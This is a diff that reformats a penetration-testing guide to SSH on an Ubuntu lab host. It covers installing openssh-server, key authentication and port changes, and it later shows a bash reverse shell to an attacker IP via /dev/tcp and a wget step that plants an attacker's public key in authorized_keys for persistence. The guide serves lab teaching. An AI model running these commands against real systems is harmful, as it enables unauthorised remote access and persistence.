@@ -51,14 +51,27 @@ The terminal sessions in this guide follow the conventions of the shell itself, 
 Before any testing can begin, the target has to actually be running the service we intend to attack. On a freshly provisioned Ubuntu server the client tools are usually present but the *server* is not, because Ubuntu's default installation does not expose a remote shell unless the administrator asks for one. Installing it is a single package operation performed from the APT package manager, and it is worth doing yourself at least once so that you know exactly what the "before" state of a target looks like.
 
 ```bash
-pentest@ubuntu-lab:~$ sudo apt update
+sudo apt update
+```
+
+**Output:**
+
+```text
 Hit:1 http://archive.ubuntu.com/ubuntu jammy InRelease
 Hit:2 http://security.ubuntu.com/ubuntu jammy-security InRelease
 Reading package lists... Done
 Building dependency tree... Done
 Reading state information... Done
 All packages are up to date.
-pentest@ubuntu-lab:~$ sudo apt install openssh-server
+```
+
+```bash
+sudo apt install openssh-server
+```
+
+**Output:**
+
+```text
 Reading package lists... Done
 Building dependency tree... Done
 Reading state information... Done
@@ -95,7 +108,12 @@ Four packages arrive in this transaction and each one exists for a reason worth 
 The last few lines of the transcript are also informative. The `Created symlink /etc/systemd/system/sshd.service` message is systemd's way of saying that the service is now enabled: it will start on boot, and it can be started, stopped and restarted with `systemctl`. Ubuntu's packaging starts the daemon immediately after installation, so the very next thing to confirm is that it really is listening, and on which socket:
 
 ```bash
-pentest@ubuntu-lab:~$ systemctl status ssh --no-pager
+systemctl status ssh --no-pager
+```
+
+**Output:**
+
+```text
 ● ssh.service - OpenBSD Secure Shell server
      Loaded: loaded (/lib/systemd/system/ssh.service; enabled; vendor preset: enabled)
      Active: active (running) since Thu 2024-01-11 09:52:41 UTC; 4min ago
@@ -112,7 +130,15 @@ Jan 11 09:52:41 ubuntu-lab systemd[1]: Starting OpenBSD Secure Shell server...
 Jan 11 09:52:41 ubuntu-lab sshd[812]: Server listening on 0.0.0.0 port 22.
 Jan 11 09:52:41 ubuntu-lab sshd[812]: Server listening on :: port 22.
 Jan 11 09:52:41 ubuntu-lab systemd[1]: Started OpenBSD Secure Shell server.
-pentest@ubuntu-lab:~$ ss -tlnp | grep sshd
+```
+
+```bash
+ss -tlnp | grep sshd
+```
+
+**Output:**
+
+```text
 LISTEN 0      128          0.0.0.0:22        0.0.0.0:*    users:(("sshd",pid=812,fd=3))
 LISTEN 0      128             [::]:22           [::]:*    users:(("sshd",pid=812,fd=4))
 ```
@@ -298,9 +324,22 @@ The two trailing lines are the most operationally significant, and they are easy
 In this lab the distinction is academic, because `pentest` is a full administrator with a passwordless sudo rule. That is worth confirming by hand once you have an interactive session, and the confirmation is a two-command affair:
 
 ```bash
-pentest@ubuntu-lab:~$ id
+id
+```
+
+**Output:**
+
+```text
 uid=1001(pentest) gid=1001(pentest) groups=1001(pentest),27(sudo)
-pentest@ubuntu-lab:~$ sudo -ln
+```
+
+```bash
+sudo -ln
+```
+
+**Output:**
+
+```text
 Matching Defaults entries for pentest on ubuntu-lab:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
 
@@ -347,7 +386,15 @@ Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-91-generic x86_64)
   Swap usage:   0%                IPv6 address for eth0: fe80::20c:29ff:fe1b:2c3d
 
 Last login: Thu Jan 11 09:58:02 2024 from 192.168.1.9
-pentest@ubuntu-lab:~$ id
+```
+
+```bash
+id
+```
+
+**Output:**
+
+```text
 uid=1001(pentest) gid=1001(pentest) groups=1001(pentest),27(sudo)
 ```
 
@@ -467,15 +514,34 @@ Sooner or later every administrator considers moving SSH off port 22. The reason
 The change is made in the server configuration file, `/etc/ssh/sshd_config`. The file is a plain text file of `Keyword value` pairs, most of which are commented out with `#` and show the default that applies when the line is absent.
 
 ```bash
-pentest@ubuntu-lab:~$ cd /etc/ssh
-pentest@ubuntu-lab:/etc/ssh$ ls
+cd /etc/ssh
+```
+
+```bash
+ls
+```
+
+**Output:**
+
+```text
 moduli  ssh_config  ssh_config.d  ssh_host_ecdsa_key  ssh_host_ecdsa_key.pub
 ssh_host_ed25519_key  ssh_host_ed25519_key.pub  ssh_host_rsa_key
 ssh_host_rsa_key.pub  sshd_config  sshd_config.d
-pentest@ubuntu-lab:/etc/ssh$ grep -n "^#Port\|^Port\|^#PasswordAuthentication\|^PasswordAuthentication" sshd_config
+```
+
+```bash
+grep -n "^#Port\|^Port\|^#PasswordAuthentication\|^PasswordAuthentication" sshd_config
+```
+
+**Output:**
+
+```text
 13:#Port 22
 58:#PasswordAuthentication yes
-pentest@ubuntu-lab:/etc/ssh$ sudo nano sshd_config
+```
+
+```bash
+sudo nano sshd_config
 ```
 
 The `grep` output tells the whole story before the editor even opens. `#Port 22` on line 13 is a comment: it documents the compiled-in default of 22, and the daemon is indeed listening on 22 because nothing has overridden it. `#PasswordAuthentication yes` on line 58 does the same for password authentication — and again, because the line is commented, the package default governs, and that default is to accept passwords. Editing the file means turning the first of those into an active directive and, later in section 7, turning the second into an explicit `no`.
@@ -489,8 +555,16 @@ Port 2222
 The `nano` shortcuts are worth committing to memory if you are new to the editor: `Ctrl+W` searches for text (the fastest way to find line 58 in a file of 130 lines), `Ctrl+O` followed by Enter saves, `Ctrl+X` exits, and the bottom of the screen always shows the current menu. Once the file is saved, the daemon has to be told to re-read it, and on Ubuntu the service is managed by systemd:
 
 ```bash
-pentest@ubuntu-lab:/etc/ssh$ sudo systemctl restart ssh
-pentest@ubuntu-lab:/etc/ssh$ ss -tlnp | grep sshd
+sudo systemctl restart ssh
+```
+
+```bash
+ss -tlnp | grep sshd
+```
+
+**Output:**
+
+```text
 LISTEN 0      128          0.0.0.0:2222      0.0.0.0:*    users:(("sshd",pid=2317,fd=3))
 LISTEN 0      128             [::]:2222         [::]:*    users:(("sshd",pid=2317,fd=4))
 ```
@@ -552,7 +626,12 @@ This section sets up key-based authentication on the target, then disables passw
 The client-side tool for making a key pair is `ssh-keygen`. Run with no arguments it asks three questions — where to save the key, what passphrase to protect it with, and (historically) what key type and size to use. The default location is `~/.ssh/id_ed25519` (older versions default to `id_rsa`) and the pair consists of a private key file, which must never leave the machine, and a public key file with a `.pub` suffix, which is designed to be copied anywhere.
 
 ```bash
-pentest@ubuntu-lab:~$ ssh-keygen
+ssh-keygen
+```
+
+**Output:**
+
+```text
 Generating public/private rsa key pair.
 Enter file in which to save the key (/home/pentest/.ssh/id_rsa): 
 Enter passphrase (empty for no passphrase): 
@@ -573,7 +652,15 @@ The key's randomart image is:
 |   . = .  .B.O   |
 |     .+ ..+o+.o  |
 +----[SHA256]-----+
-pentest@ubuntu-lab:~$ ls -l .ssh
+```
+
+```bash
+ls -l .ssh
+```
+
+**Output:**
+
+```text
 total 8
 -rw------- 1 pentest pentest 2655 Jan 11 10:25 id_rsa
 -rw-r--r-- 1 pentest pentest  572 Jan 11 10:25 id_rsa.pub
@@ -590,20 +677,47 @@ The third detail is the file permissions, which are enforced rather than suggest
 Trusting the key is a second, separate step performed on the *server*: the public key must be appended to the `~/.ssh/authorized_keys` file of the account that should be allowed to log in with it. That file is a plain list of public keys, one per line, and every key in it is a permanent promise that whoever holds the matching private key may log in as this user.
 
 ```bash
-pentest@ubuntu-lab:~$ cd .ssh
-pentest@ubuntu-lab:~/.ssh$ ls -la
+cd .ssh
+```
+
+```bash
+ls -la
+```
+
+**Output:**
+
+```text
 total 12
 drwx------ 2 pentest pentest 4096 Jan 11 10:25 .
 drwxr-x--- 5 pentest pentest 4096 Jan 11 10:20 ..
 -rw------- 1 pentest pentest 2655 Jan 11 10:25 id_rsa
 -rw-r--r-- 1 pentest pentest  572 Jan 11 10:25 id_rsa.pub
-pentest@ubuntu-lab:~/.ssh$ cat id_rsa.pub >> authorized_keys
-pentest@ubuntu-lab:~/.ssh$ ls -l
+```
+
+```bash
+cat id_rsa.pub >> authorized_keys
+```
+
+```bash
+ls -l
+```
+
+**Output:**
+
+```text
 total 16
 -rw------- 1 pentest pentest  572 Jan 11 10:26 authorized_keys
 -rw------- 1 pentest pentest 2655 Jan 11 10:25 id_rsa
 -rw-r--r-- 1 pentest pentest  572 Jan 11 10:25 id_rsa.pub
-pentest@ubuntu-lab:~/.ssh$ cat authorized_keys
+```
+
+```bash
+cat authorized_keys
+```
+
+**Output:**
+
+```text
 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7VQ0mTf3xYq1r8pL2kZ9dN4sW6hXaE5jC0oB7uM1vR3tQ... pentest@ubuntu-lab
 ```
 
@@ -628,7 +742,12 @@ PasswordAuthentication no
 On a modern Ubuntu the effective configuration is assembled from `sshd_config` plus every file in `/etc/ssh/sshd_config.d/`, and one of those drop-in files may set `PasswordAuthentication yes` with a higher precedence, because in OpenSSH the *first* value found for a keyword wins. That is why the reliable way to check the effective settings is not to read the files but to ask the daemon:
 
 ```bash
-pentest@ubuntu-lab:~/.ssh$ sudo sshd -T | grep -i "passwordauthentication\|kbdinteractive\|permitrootlogin"
+sudo sshd -T | grep -i "passwordauthentication\|kbdinteractive\|permitrootlogin"
+```
+
+**Output:**
+
+```text
 passwordauthentication no
 kbdinteractiveauthentication yes
 permitrootlogin prohibit-password
@@ -1026,7 +1145,12 @@ The rename is cosmetic but practical: the loot filename is unique and unambiguou
 Suppose the engagement has moved past the initial shell and the brief is to see what else the host is running. A quick look at the listening sockets on the target answers the question immediately, and the answer is usually more interesting than the port we came in through.
 
 ```bash
-pentest@ubuntu-lab:~$ netstat -ntlp
+netstat -ntlp
+```
+
+**Output:**
+
+```text
 (Not all processes could be identified, non-owned process info
  will not be shown, you would have to be root to see it all.)
 Active Internet connections (only servers)
@@ -1113,7 +1237,7 @@ The listener is started first, on the attacker machine, and it uses `nc` (netcat
 With the listener waiting, the payload is typed into the SSH session we already have on the target:
 
 ```bash
-pentest@ubuntu-lab:~$ bash -i >& /dev/tcp/192.168.1.17/1234 0>&1
+bash -i >& /dev/tcp/192.168.1.17/1234 0>&1
 ```
 
 The syntax is terse and repays being read carefully. `bash -i` starts an *interactive* shell, which gives us a prompt and job control. `>& /dev/tcp/192.168.1.17/1234` opens a TCP connection to the attacker and redirects both standard output and standard error into it. `0>&1` then points standard input at the same connection, closing the loop so that keystrokes typed by the attacker arrive at the shell. The result is a full-duplex channel between a bash process on the target and the netcat process on the attacker; nothing is written to disk, no binary is dropped, and the target is not listening on any new port.
@@ -1227,8 +1351,16 @@ updog -p 80
 `updog` is a small Python HTTP server with a directory listing; `python3 -m http.server 80` does the same job with no extra tooling at all. Either way, the attacker machine is now serving the contents of `/root/.ssh/` on port 80, and the request log confirms when the target actually fetches the file. On the target, inside the existing SSH session, the key is downloaded and installed:
 
 ```bash
-pentest@ubuntu-lab:~$ cd .ssh
-pentest@ubuntu-lab:~/.ssh$ wget http://192.168.1.17/id_ed25519.pub -O attacker_key.pub
+cd .ssh
+```
+
+```bash
+wget http://192.168.1.17/id_ed25519.pub -O attacker_key.pub
+```
+
+**Output:**
+
+```text
 --2024-01-11 10:54:02--  http://192.168.1.17/id_ed25519.pub
 Connecting to 192.168.1.17:80... connected.
 HTTP request sent, awaiting response... 200 OK
@@ -1238,9 +1370,19 @@ Saving to: 'attacker_key.pub'
 attacker_key.pub                      100%[=====================================>]     100  --.-KB/s    in 0s      
 
 2024-01-11 10:54:02 (12.3 MB/s) - 'attacker_key.pub' saved [100/100]
+```
 
-pentest@ubuntu-lab:~/.ssh$ cat attacker_key.pub >> authorized_keys
-pentest@ubuntu-lab:~/.ssh$ ls -al
+```bash
+cat attacker_key.pub >> authorized_keys
+```
+
+```bash
+ls -al
+```
+
+**Output:**
+
+```text
 total 20
 drwx------ 2 pentest pentest 4096 Jan 11 10:54 .
 drwxr-x--- 5 pentest pentest 4096 Jan 11 10:20 ..
